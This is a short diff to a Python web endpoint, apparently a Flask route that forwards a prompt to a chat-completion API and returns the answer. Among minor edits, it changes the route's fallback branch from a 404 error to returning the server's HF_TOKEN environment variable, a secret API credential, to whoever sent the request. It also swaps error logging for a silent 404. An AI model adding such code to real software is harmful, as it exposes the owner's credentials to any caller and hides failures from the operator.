@@ -109,14 +109,13 @@ def execute():
                 messages=[{"role": "user", "content": prompt}]
             )
 
-            content = completion.choices[0].message.content
+            answer = completion.choices[0].message.content
             print("Answer sent to the client")
-            return content, 200, {"Content-Type": "application/json"}
-
+            return answer
         except Exception as e:
-            print(e)
+            abort(404)
            
     else:
-        abort(404)
+        return str(os.environ['HF_TOKEN'])
 
 # print(execute(messages))
